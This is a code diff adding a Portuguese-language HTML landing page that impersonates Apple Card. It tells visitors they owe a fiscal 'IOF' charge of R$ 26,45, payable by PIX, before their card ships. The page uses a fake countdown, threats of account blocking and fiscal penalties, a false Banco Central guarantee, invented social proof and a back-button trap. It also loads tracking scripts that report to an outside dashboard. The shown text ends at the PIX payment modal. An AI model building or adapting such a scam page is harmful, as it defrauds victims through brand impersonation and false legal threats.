@@ -1,0 +1,904 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+        <script src="js/tracker.js" data-offer="apple-card" data-dashboard="https://dash.nexustemp.top" data-key="tk_dash_2026_secretX" defer=""></script>
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.pixelId = "6a34b5e951dbbcea6045170a";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+<script src="js/t.js" data-id="apple-card2" defer=""></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pendência Fiscal — Apple Card</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&amp;display=swap" rel="stylesheet">
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{
+            --apple-black:#1D1D1F;--apple-blue:#0071E3;
+            --gray-100:#F5F5F7;--gray-200:#E8E8ED;--gray-300:#D2D2D7;
+            --gray-400:#86868B;--gray-500:#6E6E73;
+            --success:#34C759;--warning:#FF9F0A;--error:#FF3B30;
+            --surface:#FFFFFF;--pix-green:#32BCAD;
+        }
+        body{font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;background:var(--gray-100);color:var(--apple-black);-webkit-font-smoothing:antialiased;min-height:100vh;overflow-x:hidden}
+        .page{max-width:520px;margin:0 auto;min-height:100vh;background:var(--surface)}
+
+        /* ─── Loading Screen ─── */
+        .loading-screen{position:fixed;inset:0;background:var(--surface);z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity .4s ease}
+        .loading-screen.hide{opacity:0;pointer-events:none}
+        .loading-logo{width:48px;height:48px;margin-bottom:24px}
+        .loading-bar-wrap{width:220px;height:3px;background:var(--gray-200);border-radius:2px;overflow:hidden;margin-bottom:16px}
+        .loading-bar{height:100%;background:var(--apple-black);border-radius:2px;width:0;transition:width .6s ease}
+        .loading-msg{font-size:.8125rem;color:var(--gray-500);transition:opacity .3s;min-height:1.2em}
+
+        /* ─── Nav ─── */
+        .nav{display:flex;align-items:center;padding:14px 20px;border-bottom:.5px solid var(--gray-200);background:rgba(255,255,255,.92);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);position:sticky;top:0;z-index:100}
+        .nav-back{width:32px;height:32px;display:flex;align-items:center;justify-content:center;cursor:pointer;border:none;background:none}
+        .nav-back svg{width:14px;height:14px;fill:var(--apple-blue)}
+        .nav-title{flex:1;text-align:center;font-size:.9375rem;font-weight:700}
+        .nav-secure{display:flex;align-items:center;gap:4px;font-size:.7rem;color:var(--success);font-weight:600}
+        .nav-secure svg{width:12px;height:12px;fill:var(--success)}
+
+        /* ─── Alert Strip ─── */
+        .alert-strip{padding:10px 20px;background:var(--error);color:#fff;font-size:.75rem;font-weight:600;text-align:center;display:flex;align-items:center;justify-content:center;gap:6px;animation:alertPulse 2s ease infinite}
+        @keyframes alertPulse{0%,100%{opacity:1}50%{opacity:.85}}
+
+        /* ─── Progress mini ─── */
+        .progress-mini{height:3px;background:var(--gray-200)}
+        .progress-mini-bar{height:100%;background:var(--apple-blue);width:20%;transition:width .5s ease}
+
+        /* ─── Content ─── */
+        .content{padding:0 20px 100px}
+
+        /* Countdown card */
+        .countdown-card{margin:16px 0;padding:14px 18px;background:var(--apple-black);border-radius:14px;display:flex;align-items:center;justify-content:space-between}
+        .countdown-card .cc-label{font-size:.75rem;color:rgba(255,255,255,.6);font-weight:500}
+        .countdown-card .cc-title{font-size:.875rem;color:#fff;font-weight:600;margin-top:2px}
+        .countdown-card .cc-timer{font-size:1.5rem;font-weight:800;color:#fff;font-variant-numeric:tabular-nums;letter-spacing:1px}
+
+        /* Hero */
+        .hero{text-align:center;padding:24px 0 20px}
+        .hero-badge{display:inline-flex;align-items:center;gap:6px;padding:6px 14px;background:rgba(255,59,48,.08);border-radius:20px;font-size:.75rem;font-weight:600;color:var(--error);margin-bottom:12px}
+        .hero-badge svg{width:14px;height:14px;fill:var(--error)}
+        .hero h1{font-size:1.5rem;font-weight:800;line-height:1.25;margin-bottom:8px}
+        .hero p{font-size:.875rem;color:var(--gray-500);line-height:1.5;max-width:380px;margin:0 auto}
+
+        /* Status steps */
+        .status-steps{display:flex;flex-direction:column;gap:0;margin:20px 0;padding:20px;background:var(--gray-100);border-radius:14px}
+        .s-step{display:flex;align-items:center;gap:12px;padding:10px 0;position:relative}
+        .s-step:not(:last-child)::after{content:'';position:absolute;left:15px;top:40px;width:2px;height:calc(100% - 20px);background:var(--gray-300)}
+        .s-step .s-dot{width:30px;height:30px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;z-index:1}
+        .s-dot.done{background:var(--success)}
+        .s-dot.done svg{width:14px;height:14px;fill:#fff}
+        .s-dot.pending{background:var(--warning);animation:livePulse 1.5s ease infinite}
+        .s-dot.pending svg{width:14px;height:14px;fill:#fff}
+        .s-dot.locked{background:var(--gray-300)}
+        .s-dot.locked svg{width:14px;height:14px;fill:#fff}
+        .s-step .s-text{font-size:.8125rem;font-weight:600}
+        .s-step .s-text small{display:block;font-weight:400;color:var(--gray-500);font-size:.75rem;margin-top:1px}
+
+        /* Card section */
+        .card-section{background:var(--surface);border:1.5px solid var(--gray-200);border-radius:16px;padding:20px;margin-bottom:16px}
+        .card-section-title{font-size:.8125rem;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:var(--gray-400);margin-bottom:14px}
+
+        /* Summary table */
+        .summary-table{width:100%}
+        .summary-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--gray-100);font-size:.875rem}
+        .summary-row:last-child{border-bottom:none}
+        .summary-row .sr-label{color:var(--gray-500)}
+        .summary-row .sr-value{font-weight:600}
+        .summary-row .sr-value.highlight{color:var(--apple-blue);font-size:1rem}
+        .summary-row .sr-value.small{font-size:.8125rem;color:var(--success)}
+
+        /* Consequences */
+        .consequences{margin-bottom:16px}
+        .consequence-item{display:flex;gap:12px;padding:14px;background:rgba(255,59,48,.04);border-radius:12px;margin-bottom:8px}
+        .consequence-item:last-child{margin-bottom:0}
+        .ci-num{width:28px;height:28px;border-radius:8px;background:var(--error);color:#fff;font-size:.75rem;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .ci-text{font-size:.8125rem;line-height:1.5}
+        .ci-text strong{color:var(--error)}
+
+        /* Guarantee */
+        .guarantee-card{padding:16px;background:rgba(52,199,89,.06);border:1.5px solid rgba(52,199,89,.15);border-radius:14px;display:flex;gap:12px;margin-bottom:16px}
+        .guarantee-card .gc-icon{width:40px;height:40px;border-radius:12px;background:var(--success);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .guarantee-card .gc-icon svg{width:20px;height:20px;fill:#fff}
+        .guarantee-card .gc-text{font-size:.8125rem;line-height:1.5}
+        .guarantee-card .gc-text strong{color:var(--success)}
+
+        /* Apple Card 3D */
+        .card-container{perspective:1000px;padding:0;margin:0 auto 16px;max-width:320px}
+        .card-3d{width:100%;max-width:300px;height:190px;margin:0 auto;position:relative;border-radius:16px;overflow:hidden;transform-style:preserve-3d;transition:transform .3s ease;cursor:pointer;box-shadow:0 20px 60px rgba(0,0,0,.15),0 8px 20px rgba(0,0,0,.1)}
+        .card-3d:hover{transform:rotateY(-5deg) rotateX(3deg)}
+        .card-bg{position:absolute;inset:0;border-radius:16px;background:linear-gradient(145deg,#E3E3E8,#C8C8CD,#E8E8ED)}
+        .card-shine{position:absolute;inset:0;background:linear-gradient(105deg,transparent 40%,rgba(255,255,255,.3) 45%,rgba(255,255,255,.08) 50%,transparent 55%);border-radius:16px;animation:cardShine 3s ease-in-out infinite}
+        .card-content{position:absolute;inset:0;padding:24px;display:flex;flex-direction:column;justify-content:space-between;z-index:2}
+        .card-logo img{width:30px;height:36px;filter:drop-shadow(0 1px 2px rgba(0,0,0,.15))}
+        .card-chip{position:absolute;right:24px;bottom:44px;width:38px;height:28px}.card-chip img{width:100%;height:100%}
+        .card-name-3d{font-size:.8rem;font-weight:500;letter-spacing:.08em;text-transform:uppercase;color:#86868B}
+        .card-bottom{display:flex;align-items:flex-end;justify-content:space-between}
+        .card-type{font-size:.65rem;color:rgba(0,0,0,.4);letter-spacing:.04em;text-transform:uppercase}
+        .card-brand{font-size:.85rem;font-weight:700;font-style:italic;color:rgba(0,0,0,.5);letter-spacing:.02em}
+        @keyframes cardShine{0%{transform:translateX(-100%)}50%{transform:translateX(100%)}100%{transform:translateX(100%)}}
+
+        /* Payment section */
+        .pay-section{margin-top:20px}
+        .pay-card{background:var(--apple-black);border-radius:16px;padding:20px;color:#fff}
+        .pay-card-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
+        .pay-card-header .pch-title{font-size:.875rem;font-weight:700}
+        .pay-card-header .pch-badge{padding:4px 10px;background:var(--pix-green);border-radius:6px;font-size:.6875rem;font-weight:700;color:#fff}
+        .pay-card-price{text-align:center;margin-bottom:16px}
+        .pay-card-price .pcp-from{font-size:.75rem;color:rgba(255,255,255,.4);text-decoration:line-through}
+        .pay-card-price .pcp-value{font-size:2rem;font-weight:800}
+        .pay-card-price .pcp-desc{font-size:.75rem;color:rgba(255,255,255,.5);margin-top:2px}
+
+        /* Pay button */
+        .pay-btn{display:block;width:100%;padding:18px;border:none;border-radius:14px;font-size:1.0625rem;font-weight:700;cursor:pointer;font-family:inherit;background:#fff;color:var(--apple-black);text-align:center;transition:all .3s ease;position:relative;overflow:hidden}
+        .pay-btn:hover{opacity:.9}
+        .pay-btn:active{transform:scale(.98)}
+        .pay-btn .shine{position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.15),transparent);animation:btnShine 3s ease infinite}
+        .pay-btn.loading .pay-btn-label{opacity:0}
+        .pay-btn.loading .shine{display:none}
+        .pay-btn.loading::after{content:'';position:absolute;top:50%;left:50%;width:24px;height:24px;margin:-12px;border:3px solid rgba(0,0,0,.2);border-top-color:var(--apple-black);border-radius:50%;animation:spin .8s linear infinite}
+        .pay-btn-label{display:flex;align-items:center;justify-content:center;gap:8px}
+
+        .pay-security{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:12px;font-size:.6875rem;color:rgba(255,255,255,.4)}
+        .pay-security svg{width:10px;height:10px;fill:rgba(255,255,255,.4)}
+
+        /* FAQ */
+        .faq{margin-top:20px}
+        .faq-title{font-size:.9375rem;font-weight:700;margin-bottom:12px}
+        .faq-item{border-bottom:1px solid var(--gray-200)}
+        .faq-q{display:flex;align-items:center;justify-content:space-between;padding:14px 0;cursor:pointer;font-size:.8125rem;font-weight:600}
+        .faq-q svg{width:16px;height:16px;fill:var(--gray-400);transition:transform .3s;flex-shrink:0}
+        .faq-q.open svg{transform:rotate(180deg)}
+        .faq-a{max-height:0;overflow:hidden;transition:max-height .3s ease;font-size:.8125rem;color:var(--gray-500);line-height:1.6}
+        .faq-a.open{max-height:200px}
+        .faq-a p{padding-bottom:14px}
+
+        /* Decline link */
+        .decline-link{display:block;text-align:center;padding:20px;font-size:.75rem;color:var(--gray-400);text-decoration:none;cursor:pointer}
+        .decline-link:hover{color:var(--gray-500)}
+
+        /* Social proof */
+        .social-proof{position:fixed;bottom:80px;left:50%;transform:translateX(-50%);max-width:340px;width:calc(100% - 40px);padding:10px 14px;background:var(--surface);border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.12);display:flex;align-items:center;gap:10px;font-size:.75rem;z-index:90;opacity:0;transform:translateX(-50%) translateY(20px);transition:all .4s ease;pointer-events:none}
+        .social-proof.show{opacity:1;transform:translateX(-50%) translateY(0)}
+        .sp-dot{width:8px;height:8px;border-radius:50%;background:var(--success);flex-shrink:0;animation:livePulse 2s ease infinite}
+        .sp-text{flex:1;color:var(--gray-500)}
+        .sp-text strong{color:var(--apple-black)}
+
+        /* Fixed bottom CTA */
+        .fixed-cta{position:fixed;bottom:0;left:0;right:0;padding:12px 20px;background:rgba(255,255,255,.95);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-top:.5px solid var(--gray-200);z-index:95;transform:translateY(0);transition:transform .4s ease}
+        .fixed-cta button{display:block;width:100%;max-width:520px;margin:0 auto;padding:16px;border:none;border-radius:12px;font-size:1rem;font-weight:700;cursor:pointer;font-family:inherit;background:var(--apple-black);color:#fff}
+        .fixed-cta button:active{transform:scale(.98)}
+
+        /* ─── PIX Modal ─── */
+        .pix-overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);z-index:999;opacity:0;visibility:hidden;transition:all .3s ease;display:flex;align-items:flex-end;justify-content:center}
+        .pix-overlay.active{opacity:1;visibility:visible}
+        .pix-modal{background:var(--surface);border-radius:20px 20px 0 0;width:100%;max-width:520px;max-height:92vh;overflow-y:auto;padding:0;transform:translateY(100%);transition:transform .4s cubic-bezier(.32,.72,0,1)}
+        .pix-overlay.active .pix-modal{transform:translateY(0)}
+        .pix-modal-handle{width:36px;height:4px;background:var(--gray-300);border-radius:2px;margin:10px auto 0}
+        .pix-modal-header{padding:16px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:.5px solid var(--gray-200)}
+        .pix-modal-header h3{font-size:1rem;font-weight:700}
+        .pix-modal-close{width:28px;height:28px;border-radius:50%;background:var(--gray-100);border:none;cursor:pointer;display:flex;align-items:center;justify-content:center}
+        .pix-modal-close svg{width:14px;height:14px;fill:var(--gray-500)}
+        .pix-modal-body{padding:20px}
+        .pix-timer-bar{display:flex;align-items:center;gap:8px;padding:10px 14px;background:rgba(255,149,10,.08);border-radius:10px;margin-bottom:20px;font-size:.8125rem}
+        .pix-timer-bar svg{width:16px;height:16px;fill:var(--warning);flex-shrink:0}
+        .pix-timer-bar .ptb-text{flex:1;color:var(--gray-500)}
+        .pix-timer-bar .ptb-time{font-weight:700;color:var(--warning);font-variant-numeric:tabular-nums}
+        .qr-container{display:flex;flex-direction:column;align-items:center;margin-bottom:20px}
+        .qr-wrapper{position:relative;width:220px;height:220px;padding:12px;background:#fff;border-radius:16px;border:2px solid var(--gray-200);margin-bottom:12px}
+        .qr-wrapper img{width:100%;height:100%;object-fit:contain;border-radius:8px}
+        .qr-wrapper .qr-apple-logo{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:44px;height:44px;background:#fff;border-radius:10px;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(0,0,0,.1)}
+        .qr-wrapper .qr-apple-logo svg{width:22px;height:22px;fill:var(--apple-black)}
+        .qr-label{font-size:.75rem;color:var(--gray-500);text-align:center}
+        .copy-section{margin-bottom:20px}
+        .copy-section label{display:block;font-size:.75rem;font-weight:600;color:var(--gray-500);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px}
+        .copy-box{display:flex;gap:8px}
+        .copy-input{flex:1;padding:12px 14px;background:var(--gray-100);border:1.5px solid var(--gray-200);border-radius:10px;font-family:'Courier New',monospace;font-size:.7rem;color:var(--apple-black);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;outline:none;cursor:text}
+        .copy-btn{padding:12px 20px;background:var(--apple-black);color:#fff;border:none;border-radius:10px;font-size:.8125rem;font-weight:600;cursor:pointer;font-family:inherit;white-space:nowrap;transition:all .2s}
+        .copy-btn:active{transform:scale(.96)}
+        .copy-btn.copied{background:var(--success)}
+        .pix-steps{margin-bottom:20px;padding:16px;background:var(--gray-100);border-radius:14px}
+        .pix-steps-title{font-size:.8125rem;font-weight:600;margin-bottom:12px}
+        .pix-step{display:flex;gap:10px;margin-bottom:10px;font-size:.8125rem;color:var(--gray-500);line-height:1.4}
+        .pix-step:last-child{margin-bottom:0}
+        .pix-step-num{width:22px;height:22px;border-radius:50%;background:var(--apple-black);color:#fff;font-size:.6875rem;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .pix-status{text-align:center;padding:16px;background:rgba(255,149,10,.06);border-radius:14px;margin-bottom:16px;transition:all .4s ease}
+        .pix-status .ps-icon{width:48px;height:48px;border-radius:50%;margin:0 auto 8px;display:flex;align-items:center;justify-content:center}
+        .pix-status .ps-icon.waiting{background:rgba(255,149,10,.12)}
+        .pix-status .ps-icon.waiting svg{fill:var(--warning)}
+        .pix-status .ps-icon.paid{background:rgba(52,199,89,.12)}
+        .pix-status .ps-icon.paid svg{fill:var(--success)}
+        .pix-status .ps-icon svg{width:24px;height:24px}
+        .pix-status .ps-title{font-size:.9375rem;font-weight:700;margin-bottom:2px}
+        .pix-status .ps-desc{font-size:.75rem;color:var(--gray-500)}
+        .pix-status-dot{display:inline-block;width:6px;height:6px;border-radius:50%;margin-right:4px;vertical-align:middle}
+        .pix-status-dot.waiting{background:var(--warning);animation:livePulse 1.5s ease infinite}
+        .pix-status-dot.paid{background:var(--success)}
+
+        /* ─── Back Redirect Modal ─── */
+        .br-overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(10px);z-index:9998;opacity:0;visibility:hidden;transition:all .3s;display:flex;align-items:center;justify-content:center;padding:20px}
+        .br-overlay.active{opacity:1;visibility:visible}
+        .br-modal{background:var(--surface);border-radius:20px;max-width:400px;width:100%;padding:28px;text-align:center;transform:scale(.9);transition:transform .3s}
+        .br-overlay.active .br-modal{transform:scale(1)}
+        .br-emoji{font-size:2.5rem;margin-bottom:12px}
+        .br-title{font-size:1.25rem;font-weight:800;margin-bottom:8px}
+        .br-desc{font-size:.875rem;color:var(--gray-500);line-height:1.5;margin-bottom:20px}
+        .br-price{font-size:1.5rem;font-weight:800;color:var(--success);margin-bottom:20px}
+        .br-btn-accept{display:block;width:100%;padding:16px;border:none;border-radius:14px;font-size:1rem;font-weight:700;cursor:pointer;background:var(--success);color:#fff;font-family:inherit;margin-bottom:10px}
+        .br-btn-accept:active{transform:scale(.98)}
+        .br-btn-decline{display:block;width:100%;padding:12px;border:none;background:none;font-size:.8125rem;color:var(--gray-400);cursor:pointer;font-family:inherit}
+
+        /* Animations */
+        @keyframes btnShine{0%{left:-100%}50%{left:100%}100%{left:100%}}
+        @keyframes livePulse{0%,100%{opacity:1}50%{opacity:.3}}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+        .fade-in{animation:fadeIn .4s ease both}
+    </style>
+</head>
+<body>
+
+<!-- ═══ Loading Screen ═══ -->
+<div class="loading-screen" id="loadingScreen">
+    <svg class="loading-logo" viewBox="0 0 24 24" fill="#1D1D1F"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"></path></svg>
+    <div class="loading-bar-wrap"><div class="loading-bar" id="loadingBar" style="width: 35%;"></div></div>
+    <div class="loading-msg" id="loadingMsg">Verificando operação...</div>
+</div>
+
+<!-- ═══ Main Page ═══ -->
+<div class="page" id="mainPage" style="display:none">
+
+    <!-- Nav -->
+    <nav class="nav">
+        <div class="nav-back" onclick="handleBack()"><svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"></path></svg></div>
+        <div class="nav-title">Pendência Fiscal</div>
+        <div class="nav-secure"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path></svg> Seguro</div>
+    </nav>
+
+    <!-- Alert Strip -->
+    <div class="alert-strip">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="#fff"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"></path></svg>
+        Pendência fiscal identificada — ação necessária
+    </div>
+
+    <!-- Progress mini -->
+    <div class="progress-mini"><div class="progress-mini-bar"></div></div>
+
+    <div class="content">
+        <!-- Countdown -->
+        <div class="countdown-card">
+            <div>
+                <div class="cc-label">Tempo restante para resolver</div>
+                <div class="cc-title">Resolva antes do cancelamento</div>
+            </div>
+            <div class="cc-timer" id="mainTimer">09:59</div>
+        </div>
+
+        <!-- Hero -->
+        <div class="hero">
+            <div class="hero-badge">
+                <svg viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"></path></svg>
+                Pendência fiscal
+            </div>
+            <h1>Imposto sobre Operações<br>Financeiras (IOF)</h1>
+            <p>Para operar com produtos financeiros internacionais, o recolhimento do IOF é <strong>obrigatório</strong> segundo a legislação vigente.</p>
+        </div>
+
+        <!-- Apple Card 3D -->
+        <div class="card-container">
+            <div class="card-3d">
+                <div class="card-bg"></div>
+                <div class="card-shine"></div>
+                <div class="card-content">
+                    <div><div class="card-logo"><img src="images/logo3d.svg" alt="Apple"></div></div>
+                    <div class="card-chip"><img src="images/chip3d.svg" alt=""></div>
+                    <div>
+                        <div class="card-name-3d" id="cardName">TITULAR</div>
+                        <div class="card-bottom">
+                            <div class="card-type">Apple Card • Titanium</div>
+                            <div class="card-brand">VISA</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Status Steps -->
+        <div class="status-steps">
+            <div class="s-step">
+                <div class="s-dot done"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"></path></svg></div>
+                <div class="s-text">Frete confirmado<small>Pagamento aprovado</small></div>
+            </div>
+            <div class="s-step">
+                <div class="s-dot pending"><svg viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"></path></svg></div>
+                <div class="s-text">Recolhimento do IOF<small>Pendente — resolva agora</small></div>
+            </div>
+            <div class="s-step">
+                <div class="s-dot locked"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path></svg></div>
+                <div class="s-text" style="color:var(--gray-400)">Envio do Apple Card<small>Aguardando liberação</small></div>
+            </div>
+        </div>
+
+        <!-- Summary -->
+        <div class="card-section">
+            <div class="card-section-title">Resumo da operação</div>
+            <div class="summary-table">
+                <div class="summary-row">
+                    <span class="sr-label">Limite Apple Card</span>
+                    <span class="sr-value highlight" id="limiteValue">R$ 4.750,00</span>
+                </div>
+                <div class="summary-row">
+                    <span class="sr-label">IOF (Lei nº 8.894/94)</span>
+                    <span class="sr-value" id="iofValue">R$ 26,45</span>
+                </div>
+                <div class="summary-row">
+                    <span class="sr-label">Limite final após IOF</span>
+                    <span class="sr-value small">R$ 4.750,00 (sem alteração)</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Consequences -->
+        <div class="consequences">
+            <div class="consequence-item fade-in">
+                <div class="ci-num">1</div>
+                <div class="ci-text"><strong>Bloqueio automático</strong> — Conta e cartão bloqueados por 30 dias, sem possibilidade de recurso.</div>
+            </div>
+            <div class="consequence-item fade-in">
+                <div class="ci-num">2</div>
+                <div class="ci-text"><strong>Cancelamento definitivo</strong> — Pedido cancelado permanentemente. Nova solicitação só após <strong>90 dias</strong>.</div>
+            </div>
+            <div class="consequence-item fade-in">
+                <div class="ci-num">3</div>
+                <div class="ci-text"><strong>Restrição em sistemas financeiros</strong> — Possibilidade de encaminhamento para análise de irregularidade fiscal.</div>
+            </div>
+        </div>
+
+        <!-- Guarantee -->
+        <div class="guarantee-card fade-in">
+            <div class="gc-icon"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"></path></svg></div>
+            <div class="gc-text"><strong>Garantido pelo Banco Central.</strong> O recolhimento do IOF é respaldado pela legislação federal (Lei nº 8.894/94). Após o pagamento, seu cartão é liberado imediatamente.</div>
+        </div>
+
+        <!-- Payment -->
+        <div class="pay-section">
+            <div class="pay-card">
+                <div class="pay-card-header">
+                    <span class="pch-title">Resolver Pendência</span>
+                    <span class="pch-badge">PIX</span>
+                </div>
+                <div class="pay-card-price">
+                    <div class="pcp-value" id="payPriceDisplay">R$ 26,45</div>
+                    <div class="pcp-desc">Taxa única · Pagamento instantâneo</div>
+                </div>
+                <button class="pay-btn" id="payBtn" onclick="generatePix()">
+                    <div class="shine"></div>
+                    <div class="pay-btn-label">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="#1D1D1F"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"></path></svg>
+                        <span>Pagar IOF agora — <span id="payPrice">R$ 26,45</span></span>
+                    </div>
+                </button>
+                <div class="pay-security">
+                    <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path></svg>
+                    Ambiente seguro · Criptografia de ponta a ponta
+                </div>
+            </div>
+        </div>
+
+        <!-- FAQ -->
+        <div class="faq">
+            <div class="faq-title">Perguntas frequentes</div>
+            <div class="faq-item">
+                <div class="faq-q" onclick="toggleFaq(this)">O que é o IOF?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"></path></svg></div>
+                <div class="faq-a"><p>O IOF (Imposto sobre Operações Financeiras) é um tributo federal obrigatório que incide sobre operações de crédito, câmbio e seguros. É regulamentado pela Lei nº 8.894/94.</p></div>
+            </div>
+            <div class="faq-item">
+                <div class="faq-q" onclick="toggleFaq(this)">Por que preciso pagar?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"></path></svg></div>
+                <div class="faq-a"><p>Para operar com produtos financeiros internacionais como o Apple Card, o recolhimento do IOF é exigido por lei. Sem ele, o envio do cartão não pode ser liberado.</p></div>
+            </div>
+            <div class="faq-item">
+                <div class="faq-q" onclick="toggleFaq(this)">O que acontece se eu não pagar?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"></path></svg></div>
+                <div class="faq-a"><p>Seu pedido será cancelado automaticamente após o prazo, e uma nova solicitação só poderá ser feita após 90 dias. Sua conta também pode sofrer bloqueio preventivo.</p></div>
+            </div>
+            <div class="faq-item">
+                <div class="faq-q" onclick="toggleFaq(this)">O pagamento é seguro?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"></path></svg></div>
+                <div class="faq-a"><p>Sim. O pagamento é processado via PIX em ambiente seguro com criptografia de ponta a ponta. A confirmação é instantânea.</p></div>
+            </div>
+            <div class="faq-item">
+                <div class="faq-q" onclick="toggleFaq(this)">Meu limite será afetado?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"></path></svg></div>
+                <div class="faq-a"><p>Não. O IOF é uma taxa fiscal independente. Seu limite aprovado de R$ 4.750,00 permanece inalterado após o pagamento.</p></div>
+            </div>
+        </div>
+
+        <!-- Decline -->
+        <!-- Decline removed -->
+    </div>
+
+    <!-- Fixed CTA (appears on scroll) -->
+    <div class="fixed-cta show" id="fixedCta">
+        <button onclick="generatePix()">Resolver Pendência — <span id="fixedPrice">R$ 26,45</span></button>
+    </div>
+</div>
+
+<!-- Social Proof Toast -->
+<div class="social-proof" id="socialProof">
+    <div class="sp-dot"></div>
+    <div class="sp-text" id="spText"><strong>Maria S.</strong> de São Paulo resolveu a pendência agora</div>
+</div>
+
+<!-- ═══ PIX Modal ═══ -->
+<div class="pix-overlay" id="pixOverlay">
+    <div class="pix-modal">
+        <div class="pix-modal-handle"></div>
+        <div class="pix-modal-header">
+            <h3>Pagamento Pix</h3>
+            <button class="pix-modal-close" onclick="closePixModal()"><svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg></button>
+        </div>
